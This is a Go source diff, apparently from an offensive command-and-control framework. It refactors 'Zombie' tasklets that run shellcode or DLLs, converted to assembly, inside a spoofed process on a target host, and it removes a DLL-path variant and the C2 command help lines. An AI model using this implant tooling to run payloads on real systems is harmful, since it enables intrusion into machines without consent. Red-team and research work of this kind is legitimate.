@@ -5,6 +5,8 @@ package task
 import (
 	"io"
 	"os"
+
+	"github.com/iDigitalFlame/xmt/cmd"
 )
 
 // SetStdin wil attempt to read all the data from the supplied reader to fill
@@ -29,9 +31,7 @@ func (z *Zombie) SetStdin(r io.Reader) error {
 //
 //  Input:
 //      Zombie struct {
-//          string          // Path
 //          []byte          // Data
-//          bool            // IsDLL
 //          []string        // Args
 //          string          // Dir
 //          []string        // Environment
@@ -54,59 +54,8 @@ func (z *Zombie) SetStdin(r io.Reader) error {
 //      uint32              // PID
 //      int32               // Exit Code
 //      []byte              // Output (Stdout and Stderr)
-//
-// C2 Client Command:
-//  zombie_asm <file> <args...>
-//  zombie_dll <file> <args...>
-//  zombie_dll_local <file> <args...>
 func ZombieAsm(b []byte, args ...string) *Zombie {
 	return &Zombie{Data: b, Args: args}
-}
-
-// ZombieDLL will create a Zombie Tasklet that can be used to run the supplied
-// DLL in a Zombie process that uses the specified command line arguments.
-//
-// The Filter attribute will attempt to set the target that runs the zombie
-// Process. If none are specified, the Process will be ran under the client
-// process.
-//
-// C2 Details:
-//  ID: WvZombie
-//
-//  Input:
-//      Zombie struct {
-//          string          // Path
-//          []byte          // Data
-//          bool            // IsDLL
-//          []string        // Args
-//          string          // Dir
-//          []string        // Environment
-//          uint32          // Flags
-//          bool            // Wait
-//          int64           // Timeout
-//          bool            // Filter Status
-//          Filter struct { // Filter
-//              bool        // Filter Status
-//              uint32      // PID
-//              bool        // Fallback
-//              uint8       // Session
-//              uint8       // Elevated
-//              []string    // Exclude
-//              []string    // Include
-//          }
-//          []byte          // Stdin Data
-//      }
-//  Output:
-//      uint32              // PID
-//      int32               // Exit Code
-//      []byte              // Output (Stdout and Stderr)
-//
-// C2 Client Command:
-//  zombie_asm <file> <args...>
-//  zombie_dll <file> <args...>
-//  zombie_dll_local <file> <args...>
-func ZombieDLL(dll string, args ...string) *Zombie {
-	return &Zombie{Path: dll, Args: args}
 }
 
 // ZombieAsmFile will create a Zombie Tasklet that can be used to run the
@@ -122,9 +71,7 @@ func ZombieDLL(dll string, args ...string) *Zombie {
 //
 //  Input:
 //      Zombie struct {
-//          string          // Path
 //          []byte          // Data
-//          bool            // IsDLL
 //          []string        // Args
 //          string          // Dir
 //          []string        // Environment
@@ -147,11 +94,6 @@ func ZombieDLL(dll string, args ...string) *Zombie {
 //      uint32              // PID
 //      int32               // Exit Code
 //      []byte              // Output (Stdout and Stderr)
-//
-// C2 Client Command:
-//  zombie_asm <file> <args...>
-//  zombie_dll <file> <args...>
-//  zombie_dll_local <file> <args...>
 func ZombieAsmFile(s string, args ...string) (*Zombie, error) {
 	b, err := os.ReadFile(s)
 	if err != nil {
@@ -168,14 +110,14 @@ func ZombieAsmFile(s string, args ...string) (*Zombie, error) {
 // Process. If none are specified, the Process will be ran under the client
 // process.
 //
+// NOTE: This converts the DLL to Assembly.
+//
 // C2 Details:
 //  ID: WvZombie
 //
 //  Input:
 //      Zombie struct {
-//          string          // Path
 //          []byte          // Data
-//          bool            // IsDLL
 //          []string        // Args
 //          string          // Dir
 //          []string        // Environment
@@ -198,17 +140,12 @@ func ZombieAsmFile(s string, args ...string) (*Zombie, error) {
 //      uint32              // PID
 //      int32               // Exit Code
 //      []byte              // Output (Stdout and Stderr)
-//
-// C2 Client Command:
-//  zombie_asm <file> <args...>
-//  zombie_dll <file> <args...>
-//  zombie_dll_local <file> <args...>
 func ZombieDLLFile(s string, args ...string) (*Zombie, error) {
 	b, err := os.ReadFile(s)
 	if err != nil {
 		return nil, err
 	}
-	return &Zombie{Data: b, IsDLL: true, Args: args}, nil
+	return &Zombie{Data: cmd.DLLToASM("", b), Args: args}, nil
 }
 
 // ZombieDLLReader will create a Zombie Tasklet that can be used to run the
@@ -219,14 +156,14 @@ func ZombieDLLFile(s string, args ...string) (*Zombie, error) {
 // Process. If none are specified, the Process will be ran under the client
 // process.
 //
+// NOTE: This converts the DLL to Assembly.
+//
 // C2 Details:
 //  ID: WvZombie
 //
 //  Input:
 //      Zombie struct {
-//          string          // Path
 //          []byte          // Data
-//          bool            // IsDLL
 //          []string        // Args
 //          string          // Dir
 //          []string        // Environment
@@ -248,17 +185,12 @@ func ZombieDLLFile(s string, args ...string) (*Zombie, error) {
 //      uint32              // PID
 //      int32               // Exit Code
 //      []byte              // Output (Stdout and Stderr)
-//
-// C2 Client Command:
-//  zombie_asm <file> <args...>
-//  zombie_dll <file> <args...>
-//  zombie_dll_local <file> <args...>
 func ZombieDLLReader(r io.Reader, args ...string) (*Zombie, error) {
 	b, err := io.ReadAll(r)
 	if err != nil {
 		return nil, err
 	}
-	return &Zombie{Data: b, IsDLL: true, Args: args}, nil
+	return &Zombie{Data: cmd.DLLToASM("", b), Args: args}, nil
 }
 
 // ZombieAsmReader will create a Zombie Tasklet that can be used to run the
@@ -274,9 +206,7 @@ func ZombieDLLReader(r io.Reader, args ...string) (*Zombie, error) {
 //
 //  Input:
 //      Zombie struct {
-//          string          // Path
 //          []byte          // Data
-//          bool            // IsDLL
 //          []string        // Args
 //          string          // Dir
 //          []string        // Environment
@@ -299,11 +229,6 @@ func ZombieDLLReader(r io.Reader, args ...string) (*Zombie, error) {
 //      uint32              // PID
 //      int32               // Exit Code
 //      []byte              // Output (Stdout and Stderr)
-//
-// C2 Client Command:
-//  zombie_asm <file> <args...>
-//  zombie_dll <file> <args...>
-//  zombie_dll_local <file> <args...>
 func ZombieAsmReader(r io.Reader, args ...string) (*Zombie, error) {
 	b, err := io.ReadAll(r)
 	if err != nil {
